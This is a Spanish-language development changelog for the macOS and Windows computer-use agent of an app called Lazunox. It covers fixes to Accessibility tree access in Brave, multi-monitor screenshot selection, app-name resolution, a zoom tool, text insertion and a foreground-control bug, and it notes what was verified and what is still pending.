+  verde, 23 skipped (Windows-only), mismo ruido ajeno `ENOEXEC`. App reiniciada con el motor nuevo;
+  modelo pre-descargado en `userData/models/voice/` (el `ggml-*.bin` viejo de whisper.cpp se borró, ya
+  no se usa).
+- **No verificado todavía**: que el dueño dicte de verdad y confirme que ahora se siente instantáneo;
+  que alguien compile/corra la app en Windows de verdad para confirmar que `sherpa-onnx-win-x64` se
+  resuelve e instala solo (la lógica de `optionalDependencies` dice que debería, pero no se probó en
+  una máquina Windows real todavía — el PC de pruebas por SSH que ya existe para la paridad Mac/Windows
+  sería el lugar natural para esa prueba).
+
+## F8-B148 — Cowork no podía tocar contenido web en segundo plano: bug real encontrado y arreglado
+
+- **El dueño pegó una transcripción real de Cowork**: pidió reproducir un canal (TVN) en Yogui TV
+  (una web) desde Brave — la tarea abrió la web bien, encontró el texto "TVN" visualmente por captura,
+  pero **nunca pudo encontrarlo ni tocarlo por Accessibility** en modo "En segundo plano"; pidió
+  "control real del ratón" (la única escalada que existe) y se quedó esperando sin que se la dieran.
+  Pregunta del dueño: "¿por qué Cowork no funciona bien, investiga qué pasa realmente o quizás las
+  tecnologías no son las correctas".
+- **Investigado de punta a punta con evidencia real, no suposición** (mismo criterio que toda esta
+  sesión — nunca se asumió "debe ser esto", se midió):
+  1. Se reprodujo el caso EXACTO con el `cu-helper` real contra Brave real: `ax-tree` devolvía apenas
+     ~435 nodos, **ninguno** de rol `AXWebArea` — es decir, NINGÚN contenido de la página (ni botones
+     de Brave mismo en `brave://accessibility/`) se exponía, solo los controles nativos del navegador
+     (barra de direcciones, botones de pestaña). Confirmado independiente con `System Events` de
+     macOS (mismo resultado: 4 elementos nomás) — no era un bug de nuestro recorrido, era que
+     Accessibility para el contenido web simplemente no se activaba.
+  2. Se armó un script de Swift aislado para llamar directo a la API de Accessibility y mirar los
+     códigos de error reales: `AXUIElementSetAttributeValue(app, "AXManualAccessibility", true)` — la
+     llamada que `helper.swift` ya hacía, pensada para activar el árbol de apps Electron/Chromium —
+     **devuelve el error `-25205` (`kAXErrorAttributeUnsupported`) en el elemento de la APLICACIÓN de
+     Brave**. La llamada fallaba en silencio desde siempre (el código no miraba el resultado).
+  3. Bajando nivel por nivel desde la ventana, se encontró CUÁL elemento sí acepta el atributo: no la
+     app, no la ventana — un `AXGroup` varios niveles adentro (el contenedor real del contenido
+     web/`WebContentsView` de Chromium). Activándolo ahí (código `0`, éxito), el árbol completo de la
+     página apareció: 1 `AXWebArea`, y el texto "TVN" repetido como `AXStaticText` real, con acción
+     `AXPress` disponible — exactamente lo que la tarea necesitaba y no podía encontrar.
+  4. Conclusión: **no es un problema de tecnología** (Accessibility como camino SÍ funciona y es
+     correcto para "segundo plano" sin tocar el ratón real) — es un bug concreto en `helper.swift`: el
+     intento de activar `AXManualAccessibility` se hacía UNA sola vez, en el elemento equivocado (la
+     app), en vez de intentarlo en cada nodo mientras se recorre el árbol (el único intento barato,
+     sin necesidad de saber de antemano cuál nodo es "el correcto").
+- **Arreglo**: `resources/computer-use/helper.swift` — el intento de `AXManualAccessibility` se movió
+  de una llamada única al principio (`axTree`/`findElements`) a DENTRO del recorrido (`AXWalker.walk`,
+  `FindElementsWalker.walk`, y también `resolveRef` por si el estado se perdió entre llamadas) — se
+  intenta en TODOS los nodos visitados; en los que no lo soportan (la gran mayoría) es un error
+  instantáneo e inofensivo, en el que sí lo soporta (el contenedor del contenido web) desbloquea todo
+  lo de abajo. Afecta a LAS DOS herramientas de "segundo plano" que recorren el árbol: `app_tree` y
+  `app_find`/`find_elements` — cualquier tarea futura con Brave/Chrome/Edge en segundo plano se
+  beneficia, no solo este caso puntual.
+- **Verificado con el binario real, no solo el script de prueba**: `cu-helper ax-find com.brave.Browser
+'{"text":"TVN"}'` (la MISMA llamada que usaría `app_find` del MCP) ahora devuelve 4 coincidencias
+  reales de "TVN" como `AXStaticText`, cada una con `actions:["AXPress",…]` y un `frame` válido — Cowork
+  ya podría haber completado la tarea original sin pedir control real del ratón. `npx vitest run
+src/main/computer`: 314 pruebas en verde (nada de TS cambió, el bug y el arreglo son puramente del
+  helper nativo; sin test automatizado posible para esto — no hay arnés de pruebas para `helper.swift`
+  en el repo, igual que el resto de los cambios nativos de Control del Mac — la verificación es la
+  llamada real de arriba).
+- **No verificado todavía**: que el dueño repita la tarea original de Yogui TV (u otra con contenido
+  web en segundo plano) y confirme que ahora sí encuentra y toca las tarjetas sin pedir control real
+  del ratón. También queda pendiente, igual que antes de este arreglo (anotado en F8-B140): la lista
+  de apps "que nunca se ocultan", la verificación de que la app en primer plano coincide con el
+  objetivo, y el tratamiento de apps de solo-píxeles (remoto/VMs) — esos son temas aparte, no
+  relacionados con este bug puntual.
+
+## F8-B149 — "Llevar Cowork al nivel de Claude": cuatro pendientes de F8-B140 resueltos de una
+
+- **El dueño, satisfecho con el arreglo de F8-B148**: "sigue investigando cómo lo podemos llevar otro
+  nivel al nivel de Claude, qué más nos estaría faltando" — y tras mostrarle dos gaps reales (bug de
+  multi-monitor con evidencia real, falta de herramienta de zoom): "arregla todo porfa abarca todo no
+  solo una parte". Se encararon los CUATRO pendientes que F8-B140 había dejado anotados a propósito,
+  más los dos gaps nuevos de esta ronda — seis en total, cada uno investigado contra el código real
+  antes de tocar nada (mismo criterio de toda la sesión).
+- **1) "La lista de apps que nunca se ocultan incluía TODA concesión de siempre" (Discord seguía
+  visible en tareas que no lo necesitaban)** — causa real: `nonGrantedBundleIds` (enmascarado de
+  capturas en segundo plano) decidía "visible" = "tiene algún nivel concedido alguna vez", nunca
+  "relevante para la tarea de AHORA". Arreglo: `service.ts` gana `taskApps` (por sesión, se llena
+  cuando se aprueba una app por tarjeta o por Modo auto, se vacía con `revokePlan` — tarea nueva,
+  lista nueva) y un endpoint nuevo `GET /task-apps?session=`; `mcp-platform-darwin.ts` lo consulta
+  ANTES del criterio viejo (que se mantiene como respaldo legado sin sesión). 8 pruebas nuevas
+  (`service-task-apps.test.ts`) + 2 en `mcp-platform-darwin.test.ts`.
+- **2) "Verificación de que la app en primer plano coincide con el objetivo" (el "casi" de WhatsApp)**
+  — `type_text`/`key` no tienen coordenadas que las anclen a una app (a diferencia de los clics, que
+  ya validan la app BAJO el punto): si el foco cambió sin que el modelo lo notara, el texto se iba a
+  la app equivocada sin ningún aviso. Arreglo: parámetro opcional `expect_app` en ambas herramientas
+  (mismo criterio defensivo que ya usa `app_press` con `expectRole`/`expectTitle`) — si no coincide
+  con la app en primer plano (sin distinguir mayúsculas, substring), NO escribe/pulsa nada y avisa
+  claro. Nuevo escenario `expect-app` en el fixture de equivalencia (5 pasos, revisado línea por
+  línea: coincide → escribe, no coincide → no escribe nada, sin distinguir mayúsculas, y sin
+  `expect_app` sigue andando igual que siempre).
+- **3) "Límite de tiempo en las llamadas de Accessibility"** — `helperExit` tiene un tope de 30s
+  pensado para `type`/`screenshot-sck` (que sí pueden tardar), pero una consulta AX normal tarda
+  milisegundos: si una app está congelada, esperar 30s por intento es carísimo. Arreglo:
+  `withAxTimeout` (8s) envolviendo `ax-tree`/`ax-find`/`ax-frame`/`ax-press`/`ax-set-value`/
+  `ax-action`/`find-elements` — el proceso nativo sigue su curso solo (lo limpia el mecanismo de
+  siempre), esto solo deja de esperarlo del lado de Node.
+- **4) Herramienta de "zoom" (la que tiene el toolset de Opus 4.5+ de Anthropic y Lazunox no tenía)**
+  — nueva herramienta `zoom`: recorta y agranda (1-4x) una región de la ÚLTIMA captura completa, sin
+  gastar una acción real. Nativo: `zoom-image` en `helper.swift` (crop + reescalado con interpolación
+  de calidad alta vía CoreGraphics) — probado con el binario real compilado (recorte 200x150 → 2.5x
+  → 500x375, JPEG real de 40KB). **Windows**: NO se improvisó código Rust sin poder compilarlo ni
+  probarlo (no hay toolchain de Rust en esta máquina) — en vez de eso, `PlatformBackend` gana el
+  método `zoomImage` (abstrae el detalle de plataforma, igual que `windowShot`); macOS lo implementa
+  de verdad, Windows devuelve un error claro ("no disponible todavía, pedí una captura nueva") sin
+  tocar el helper nativo de Rust. `protocol.json` documenta `zoom-image` como `win32: "none"` con el
+  motivo (WIC pendiente, probar en máquina real antes de declararlo). La prueba de contrato que exige
+  paridad estricta para todo comando que `mcp-server.ts` llama DIRECTO (sin pasar por el backend) fue
+  justamente la que encontró que el diseño inicial estaba mal — se corrigió moviendo la llamada al
+  backend, no debilitando la prueba.
+- **5) Mensaje más claro cuando una coordenada "está fuera de la pantalla"** — la confusión real del
+  caso de Yogui TV: el modelo intentó usar coordenadas de `app_find` (puntos de pantalla globales,
+  pueden ser negativos con un monitor secundario) directo en una herramienta de clic (que espera
+  píxeles de la última captura, siempre de la pantalla principal) — espacios de coordenadas
+  distintos. El error de `toPoints` ahora lo explica así, y sugiere `app_press`/`app_action` en vez
+  de insistir con un clic.
+- **6) Multi-monitor "de verdad" (capturar/clicar en pantallas secundarias)**: investigado a fondo
+  — `cu-helper screens` YA devuelve el x/y real de cada pantalla (confirmado en esta Mac: 3 monitores,
+  uno a `x:-1080`), pero remover la bandera `-m` de `screencapture` para capturar el escritorio
+  virtual completo NO dio lo esperado en una prueba real (seguía devolviendo solo 1920x1080, no el
+  bounding box de los 3 monitores) — necesita más investigación de la que da este margen para
+  hacerlo bien y probado. **Se dejó fuera a propósito** en vez de forzar algo sin verificar; el punto
+  (5) de arriba cubre la parte más urgente (evitar clics mal dirigidos) sin necesitar esto.
+- **Verificado**: typecheck (los 4 proyectos) limpio, lint limpio, batería completa — 5905 pruebas en
+  verde (23 skipped, Windows-only), mismo ruido ajeno `ENOEXEC`. `cu-helper` recompilado y probado a
+  mano contra Brave real. App reiniciada.
+- **No verificado todavía**: todo lo de arriba depende de interacción real con una tarea de Cowork de
+  verdad para confirmar que se siente mejor en la práctica (especialmente `expect_app` y `zoom`, que
+  requieren que el agente decida usarlos). El punto (6) (multi-monitor completo) queda como
+  investigación pendiente, no como bug conocido sin arreglar.
+
+## F8-B150 — El multi-monitor "completo" de F8-B149 — resuelto de verdad, con prueba en hardware real
+
+- **El dueño probó el prompt de zoom/expect_app con una nota real** ("Notas" en segundo plano) y
+  Cowork se encontró con el bug EXACTO que F8-B149 había dejado como "investigado pero no resuelto":
+  el sistema decía bien "Notas está en primer plano", pero la captura seguía mostrando el escritorio
+  — porque `screenshot` capturaba SIEMPRE la pantalla principal (`-m`), sin importar en qué monitor
+  estuviera la ventana real. El dueño: "sabé que pasa si tiene más pantallas, el programa se marea...
+  ahí queda la caga" — correcto, exactamente ahí.
+- **Esta vez se resolvió de punta a punta, con la Mac real del dueño (3 monitores, uno en x negativa)
+  como banco de pruebas**, retomando justo donde F8-B149 se había frenado (`screencapture` sin `-m` no
+  capturaba el escritorio virtual completo, como se esperaba):
+  - `screencapture -R<x>,<y>,<w>,<h>` (recorte por coordenadas GLOBALES, existe desde siempre, no
+    estaba en el radar) SÍ captura cualquier monitor, confirmado con los 3 monitores reales de esta
+    Mac (probado contra el monitor en `x:-1080`: devolvió exactamente 1080x1920, el tamaño real de esa
+    pantalla).
+  - `cu-helper screens` YA traía el x/y real de cada pantalla (no se usaba); ahora también trae
+    `displayID` (necesario para el único hueco que quedaba: ScreenCaptureKit, que antes SIEMPRE tomaba
+    `displays.first`, cualquiera que ScreenCaptureKit enumerara primero — ni la principal, ni
+    necesariamente la de la app en primer plano. Verificado con el binario real: pedirle el display 3
+    da 1080x1920, pedirle el 2 (principal) da 1920x1080).
+  - `mcp-server.ts` gana `screenForCapture()`: antes de cada captura, mira en qué pantalla está REALMENTE
+    la ventana de la app en primer plano (`frontmost` + `windows-of` + comparar contra `screens`) y le
+    pide ESA al backend — no siempre la principal. De paso, unifica el pedido de `frontmost` con el de
+    la pantalla en una sola función (antes `takeScreenshot` lo pedía en paralelo a la captura: dos
+    llamadas, y una carrera real entre ambas que de hecho ROMPIÓ la prueba de equivalencia la primera
+    vez que se probó esto — orden no determinista detectado y corregido ahí mismo, no ignorado).
+  - `toPoints`/`ensureRatio` ahora usan la pantalla de la ÚLTIMA captura (no siempre la principal) para
+    los límites y, al convertir a puntos, SUMAN su origen real — en la principal es (0,0), sin cambio
+    alguno respecto a como era antes; en otra pantalla (p.ej. `x:-1080`), es lo que hace que el clic
+    caiga en el punto global real en vez de fallar o caer en el lugar equivocado.
+  - `shotText` ya no dice siempre "pantalla principal": si la captura es de otra pantalla, lo dice
+    explícito, para que el modelo no asuma algo que no es cierto.
+  - Windows sin cambios de comportamiento NI de orden de llamadas (su "escritorio virtual" ya es un
+    espacio único): `screenForCapture` no hace las consultas de más ahí, y se verificó con una prueba
+    de contrato exacta que el orden de comandos al helper no cambió ni un poquito.
+- **Verificado con hardware real, no solo con dobles**: con Brave real puesto a propósito en el
+  monitor de `x:-1080` (confirmado con `frontmost`/`windows-of` reales), se corrió la cadena completa
+  (`frontmost` → `windows-of` → elegir pantalla → `screencapture -R`) con el binario compilado de
+  verdad: eligió la pantalla 3 (`x:-1080`, 1080x1920) y la capturó con esas dimensiones EXACTAS — no
+  una simulación, el flujo real contra el hardware real del dueño.
+- **Verificado automatizado**: typecheck (los 4 proyectos) limpio, lint limpio, batería completa —
+  5905 pruebas en verde (23 skipped, Windows-only), mismo ruido ajeno `ENOEXEC`. La prueba de
+  equivalencia de macOS (antes flaky por la carrera de `frontmost` — confirmado corriéndola 3+ veces
+  seguidas sin fallar tras el arreglo) y la de contrato de Windows (orden exacto de comandos) ambas en
+  verde. `cu-helper` recompilado. App reiniciada.
+- **No verificado todavía**: que el dueño repita la tarea de Notas (u otra con una app en un monitor
+  secundario) y confirme que ahora la captura muestra la ventana real en vez del escritorio/otra app.
+
+## F8-B151 — `app_insert_text`: agregar a una nota sin pedir control real del ratón
+
+- **El dueño probó el prompt de Notas en segundo plano**: el multi-monitor de F8-B150 funcionó bien
+  (el agente notó solo que la ventana estaba en otro monitor y la trajo al frente), pero se frenó en
+  el paso final — para escribir "prueba ok" al final de la nota, `app_set_value` (lo único que había
+  para escribir por accesibilidad) REEMPLAZA todo el valor del campo, y esa nota tenía un adjunto de
+  audio ("Reproducir") que un reemplazo de texto plano podía perder. El agente, correctamente, no
+  quiso arriesgarlo y pidió control real del ratón/teclado — que no se le dio, así que se quedó sin
+  terminar. El dueño: "investiga en internet algo de código abierto... una buena función al nivel de
+  Claude Code".
+- **Investigado el código oficial de Anthropic** (`claude-quickstarts/computer-use-demo`,
+  `tools/computer.py`) antes de asumir nada: confirmado que Claude NO tiene ningún control por
+  accesibilidad — todo es teclado/mouse simulado (`xdotool`) sobre una sola pantalla X11 virtual (ni
+  siquiera multi-monitor, que acá ya se resolvió en F8-B150). O sea: esto no es "ponerse al nivel de
+  Claude" en el sentido de copiarle algo que tiene — es una debilidad propia de Lazunox (su modo
+  segundo plano por Accessibility es más capaz que lo que Claude ofrece, pero tenía este hueco
+  puntual) que vale la pena arreglar por sí misma.
+- **La técnica correcta** (investigada y confirmada, no inventada): la API de Accessibility de macOS
+  permite mover el "cursor" de edición con `AXSelectedTextRange` e insertar ahí con `AXSelectedText`
+  — a diferencia de `AXValue` (lo que usa `app_set_value`), esto NO reemplaza todo el campo, inserta
+  en el punto indicado y deja el resto (adjuntos, formato) intacto.
+  - **Probado contra una nota real de Notas antes de tocar el código** (nunca contra la nota real del
+    dueño — se creó y borró una nota de prueba propia): moví el cursor al final con
+    `AXSelectedTextRange` e inserté con `AXSelectedText` usando un script de Swift aislado — funcionó
+    exacto, el contenido original quedó intacto y el texto nuevo se agregó al final.
+  - Nuevo comando nativo `ax-insert-text` en `helper.swift` (misma lógica, ya dentro del helper real) —
+    recompilado y vuelto a probar contra una SEGUNDA nota de prueba, con el binario compilado de
+    verdad: mismo resultado, agregó sin tocar el resto.
+  - Nueva herramienta `app_insert_text` (hermana de `app_set_value`, mismas reglas de seguridad —
+    rechaza campos seguros, "Control total" requerido) — el agente ahora puede elegir entre
+    "reemplazar todo" (`app_set_value`) o "agregar al final sin tocar el resto"
+    (`app_insert_text`), y la descripción de cada herramienta le dice cuándo usar cuál.
+  - **Windows**: NO se improvisó el equivalente de UI Automation sin poder compilarlo ni probarlo (no
+    hay `cargo` en esta máquina) — `app_insert_text` vive detrás de `PlatformBackend.insertAxText`
+    (mismo patrón que `zoomImage` de F8-B149): macOS lo implementa de verdad, Windows falla con un
+    mensaje claro ("no disponible todavía, usa app_set_value con cuidado o pide control real").
+    `protocol.json` documenta `ax-insert-text` como `win32: "none"` con el motivo.
+- **Pruebas**: 2 pasos nuevos en el fixture de equivalencia (`accesibilidad-app`: camino feliz, agrega
+  8 caracteres; `codigos-de-salida-del-helper`: campo seguro, código 9) — ambos revisados a mano.
+- **Verificado**: typecheck (los 4 proyectos) limpio, lint limpio, batería completa — 5905 pruebas en
+  verde (23 skipped, Windows-only), mismo ruido ajeno `ENOEXEC`. `cu-helper` recompilado y probado DOS
+  veces con notas reales de prueba (creadas y borradas por este mismo proceso, nunca con la nota real
+  del dueño). App reiniciada.
+- **No verificado todavía**: que el dueño repita la tarea de Notas completa (incluido el paso de
+  escribir al final) y confirme que `app_insert_text` funciona en la práctica sin pedir control real
+  — y que el agente elija usarla en vez de `app_set_value` para este tipo de caso.
+
+## F8-B152 — El "se traba" de Notas no era un bug: faltaba documentar `zoom`/`app_insert_text`
+
+- **El dueño repitió la tarea de Notas con el prompt que incluía `app_insert_text`**: el agente se
+  frenó igual, esta vez porque la condición del prompt ("asegurándote primero de que Notas sigue
+  siendo la app en primer plano") nunca se cumplía — `open_application`/`AXRaise` en segundo plano
+  NUNCA activan de verdad la app (es a propósito, para no robarle el foco al usuario), así que la
+  condición tal como estaba escrita era irrealizable. El dueño: "algo pasa wn de verdad, buscá en
+  GitHub algo que podamos dejar esto pulido".
+- **Investigado antes de tocar nada, y la conclusión es otra de la esperada**: `computer.md` (el
+  manual que el propio agente lee) YA dice clarísimo que las herramientas `app_*` funcionan "sin
+  activar la app ni robarle el foco al usuario" — `app_insert_text` nunca necesitó que Notas fuera
+  la app en primer plano, eso fue una condición agregada en el PROMPT DE PRUEBA (mío, de esta
+  sesión), no un requisito real de la herramienta. El agente simplemente obedeció al pie de la letra
+  una condición mal puesta. No es un bug de Lazunox — es un prompt de prueba mal escrito.
+- **Lo que SÍ era un gap real, encontrado al revisar el manual por este motivo**: ni `app_insert_text`
+  (F8-B151, de hoy mismo) ni `zoom` (F8-B149) estaban documentadas en `computer.md` — el agente no
+  tenía forma de saber que existían fuera de un prompt que las mencionara por nombre a propósito
+  (como el mío). En una tarea real, sin ese empujón, el agente ni se enteraba. Arreglado:
+  - `app_insert_text` documentada junto a `app_set_value`, explicando cuándo usar cada una
+    (reemplazar todo vs. agregar sin tocar el resto) y qué hacer si falla.
+  - `computer_zoom` documentada junto a `computer_screenshot`, aclarando que solo sirve sobre
+    capturas de pantalla completa (no `app_screenshot`, que tiene su propio espacio de coordenadas)
+    — la mezcla exacta que el dueño pidió en el prompt de prueba ("zoom" sobre una app en segundo
+    plano) y que no podía funcionar así.
+  - `expect_app` (F8-B149, `type_text`/`key`) también documentado — no tenía ninguna mención.
+  - De paso, la descripción de `computer_screenshot` se actualizó: decía "pantalla principal"
+    siempre, ahora dice lo que es desde F8-B150 (la pantalla con la app en primer plano).
+- **Verificado**: `agent-prompts.test.ts`/`computer-agent.test.ts`/`opencode-config.test.ts` en verde
+  (nada de esto tocaba su estructura de 10 pasos ni la lógica de distribución del archivo). App
+  reiniciada para que la próxima tarea de Cowork use el manual actualizado.
+- **No verificado todavía**: que una tarea real (sin un prompt que mencione `app_insert_text`/`zoom`
+  por nombre) el agente las descubra y use solo, ahora que están en el manual.
+
+## F8-B153 — "Notes" resolvía a un servicio auxiliar en vez de Notas: bug real de nombres, no de foco
+
+- **El dueño probó una tarea difícil a propósito** (leer Spotify, escribir en Notas, buscar la hora
+  en Brave, con multi-monitor y `app_insert_text` de por medio). Spotify salió perfecto. Pero en
+  Notas: "el árbol de Notas salió vacío (resolvió a un servicio auxiliar)" — el agente pidió la app
+  por su nombre en INGLÉS ("Notes", natural para un LLM, aunque el resto del prompt decía "Notas" en
+  español) y `resolve-app` devolvió `com.apple.LinkedNotesUIService` (un proceso de fondo sin
+  ventana, no la app real) con `found: true` — de ahí para adelante, nada podía funcionar.
+- **Reproducido con el helper real antes de asumir nada**: `cu-helper resolve-app "Notes"` daba
+  exactamente ese bundle id erróneo; `resolve-app "Notas"` (español) sí daba `com.apple.Notes`
+  correcto. La hipótesis inicial (que el buscador de Spotlight al final de `resolveApp` lo causaba)
+  resultó ser INCORRECTA al investigar más — el motivo real es más simple y más interesante:
+  `LinkedNotesUIService` es un proceso de verdad corriendo de fondo (sin ventana, invisible en
+  `running-apps`, pero presente en la lista completa de `NSWorkspace.runningApplications` que usa
+  `resolveApp`), y "notes" es literalmente una subcadena de su propio nombre
+  ("Linked**Notes**UIService") — la comparación "parcial" que ya existía (`contains`) lo atrapaba
+  antes de llegar a ningún otro chequeo.
+- **Arreglo real**: el bundle id de una app casi siempre queda en inglés sin importar el idioma del
+  sistema (`com.apple.Notes` sigue siendo así aunque el Mac esté en español y la app se vea como
+  "Notas") — se agregó una comparación por el ÚLTIMO SEGMENTO del bundle id ("Notes" de
+  "com.apple.Notes") y, más importante, se la puso ANTES de la comparación parcial/floja que ya
+  existía (no después): una coincidencia exacta de nombre o de sufijo de bundle id es una señal más
+  fuerte que "la subcadena aparece en el nombre de cualquier proceso corriendo", y debe ganarle.
+  Mismo cambio en `resolveApp` (usada por `request_access`/`app_*`) y `findRunningApp` (usada por
+  `activate`), mismo orden en las dos.
+- **Verificado con el binario real, no solo en teoría**: `cu-helper resolve-app "Notes"` ahora da
+  `com.apple.Notes` (antes `com.apple.LinkedNotesUIService`); `"Notas"`, `"Brave"` y `"Spotify"`
+  siguen dando lo mismo que antes (sin regresión). Batería completa de `src/main/computer` en verde
+  — 325 pruebas (este bug y su arreglo son puramente nativos, sin fixture/mock que lo cubra; la
+  verificación es la llamada real de arriba).
+- **No verificado todavía**: que el dueño repita la tarea completa y confirme que pedir "Notes" (o
+  cualquier app con nombre distinto entre inglés y el idioma del sistema) ya encuentra la app
+  correcta de punta a punta.
+
+## F8-B154 — `open_application` ignoraba el control real ya concedido para la sesión
+
+- **El dueño pegó una transcripción real de una tarea con Discord** donde, aunque ya se le había
+  concedido control real (`request_full_control`) dentro de la misma tarea, al pedir abrir/activar
+  Discord después el agente seguía comportándose como si estuviera en modo "En segundo plano": la
+  app nunca llegaba de verdad al frente. Comparado contra la misma tarea resuelta por Claude (sin
+  ese problema), confirmó que era un bug real de Lazunox, no una limitación de Discord.
+- **Causa real, encontrada revisando el código, no adivinada**: `controlMode(session)` devuelve DOS
+  datos independientes — `mode` (la preferencia GLOBAL de la persona: "En segundo plano" vs "Control
+  de la pantalla") y `foreground` (si ESTA sesión en particular ya recibió control real temporal vía
+  `request_full_control`, sin importar la preferencia global). El resto del código (`requireForeground`,
+  el propio handler de `request_full_control`) ya usaba correctamente los dos: `mode === 'background'
+  && !foreground`. Pero la herramienta `open_application` solo miraba `mode`, así que aunque
+  `foreground` fuera `true` seguía tomando la rama de "abrir sin activar" (`open-app-bg`) como si
+  nunca se hubiera concedido nada.
+- **Arreglo**: en `mcp-server.ts`, `open_application` ahora desestructura también `foreground` y usa
+  la misma condición de dos factores que ya usaban `requireForeground`/`request_full_control`
+  (`mode === 'background' && !foreground`) en vez de mirar solo `mode`.
+- **Verificado**: revisados los tres únicos lugares de `mcp-server.ts` que llaman a `controlMode` —
+  los otros dos ya estaban bien, el bug estaba aislado a este. Agregado el escenario
+  `segundo-plano-con-control-concedido` a `mcp-server.equivalence.test.ts` (preferencia global en
+  "En segundo plano" pero `foreground: true` para la sesión) — el fixture regenerado confirma que
+  ahora `open_application` hace la secuencia real `open-app`+`activate`+`frontmost` (no `open-app-bg`)
+  y devuelve "App en primer plano: Notes", igual que en modo "Control de la pantalla". Batería
+  completa de `src/main/computer` en verde (326 pruebas, la nueva incluida) y batería del repo
+  completo (`src/renderer src/main src/shared`, 5906 pruebas) sin regresión. `typecheck`/`lint`/
+  `prettier` limpios. App de desarrollo reiniciada.
+- **No verificado todavía**: que el dueño repita la tarea real de Discord (pedir control real,
+  luego pedir abrir/activar la app) y confirme que ahora sí llega al frente de verdad.
+
+## F8-B155 — multi-monitor otra vez: una ventana auxiliar de la misma app podía ganarle a la real
+
+- **Con F8-B154 ya probado en vivo** (el dueño reprodujo el escenario exacto de Discord: pidió
+  control real, luego pidió abrir y traer Discord al frente), el `open_application`/`activate` SÍ
+  activó Discord de verdad (confirmado: `frontmost` devolvía Discord, `AXRaise` aplicado, la
+  ventana "Amigos - Discord" existía con `hasWindow: true`) — pero las capturas de pantalla
+  COMPLETA seguían mostrando el escritorio con OTRO monitor (la vertical, con Spotify en la barra
+  de menús), mientras una captura de LA VENTANA (`window-shot`, sin pasar por selección de
+  pantalla) sí mostraba Discord bien. El dueño, cansado de parches a ciegas, pidió explícitamente
+  buscar cómo lo resuelven proyectos de código abierto reales antes de tocar nada más.
+- **Investigado con las propias apps reales de esta Mac (3 monitores) antes de tocar código**:
+  `cu-helper windows-of com.hnc.Discord` con la ventana real de Discord devolvía correctamente su
+  posición (224,62, 1696×928, dentro de la pantalla principal) — un intento manual exacto del mismo
+  camino que usa `screenForCapture` (activar → esperar 800 ms → `windows-of` → `screencapture -R`
+  con esos límites) SÍ mostró Discord bien en la captura. O sea: el bug real no es reproducible de
+  forma determinista con el estado actual — depende de que exista, en el momento exacto de la
+  captura, una ventana AUXILIAR de la misma app (overlay de notificaciones, HUD, panel flotante —
+  Discord tiene varias) que la gane en orden z y quede como `wins[0]` de `windowsOf`, llevando a
+  `screenForCapture` a la pantalla de ESA ventana en vez de la de contenido real.
+- **Investigación en código abierto real, como pidió el dueño**: comparado contra Hammerspoon
+  (`hs.window`, `extensions/window/libwindow.m`) y Peekaboo (steipete/Peekaboo, herramienta de
+  capturas por ventana en macOS). Ambos coinciden en el mismo criterio para distinguir "ventana de
+  contenido real" de HUD/overlay/panel-flotante: la CAPA de la ventana (`kCGWindowLayer`) — las
+  ventanas normales de app son capa 0, los overlays/HUD/paneles flotantes casi siempre no — más un
+  umbral de transparencia (`kCGWindowAlpha`). Hammerspoon lo hace indirectamente (se queda con las
+  ventanas "por debajo del Dock", que de hecho excluye todo lo que vive en capas superiores);
+  Peekaboo lo hace explícito: primer filtro `kCGWindowLayer == 0`, descarta además `alpha ≤ 0.01`.
+  Nuestro `windowsOf()` (`helper.swift`) no filtraba por NINGUNO de los dos — tomaba cualquier
+  ventana on-screen de la app, sin distinguir HUD de contenido real.
+- **Arreglo, con la misma base real investigada**: `windowsOf()` ahora descarta ventanas con
+  `kCGWindowLayer != 0` o `kCGWindowAlpha ≤ 0.01` — mismo criterio que Hammerspoon/Peekaboo. Afecta
+  a las DOS cosas que usan esta función: la selección de pantalla de `screenForCapture` (el bug de
+  hoy) y el enmascarado de apps no concedidas en la captura compuesta (F8-B149) — en ambos casos
+  solo nos interesa la ventana de contenido real, nunca un overlay. Además, de paso: `screenForCapture`
+  elegía la pantalla mirando si el CENTRO de la ventana caía dentro de sus límites — un criterio que
+  falla con una ventana cerca del borde entre dos monitores. Cambiado al criterio estándar (mismo
+  que usa Hammerspoon): la pantalla con MÁS ÁREA de solapamiento real con la ventana, no un punto.
+- **Verificado**: recompilado `cu-helper`; `windows-of` repetido contra Discord, Brave, Spotify y
+  Notas reales (las cuatro apps de la tarea original) sigue devolviendo exactamente la misma ventana
+  de contenido de antes — sin regresión (ninguna de ellas tenía un overlay activo ahora mismo para
+  probar el caso exacto que lo disparó, así que el filtro no tenía nada que descartar en esta
+  pasada, pero tampoco rompió nada). Batería completa de `src/main/computer` en verde (326 pruebas,
+  el cambio de área-de-solapamiento no rompió ningún escenario del fixture de equivalencia).
+  `typecheck`/`lint`/`prettier` limpios. App de desarrollo reiniciada con el helper recompilado.
+- **No verificado todavía**: el caso exacto que lo disparó (una ventana auxiliar de Discord —u otra
+  app— presente justo en el momento de la captura) no se pudo forzar de forma determinista desde
+  acá sin tocar configuración de Discord del dueño. Falta que el dueño repita una tarea real de
+  Discord con multi-monitor (ideal: con una notificación o el overlay de voz activo) y confirme que
+  la captura de pantalla completa ya muestra lo mismo que `window-shot` mostraba bien.
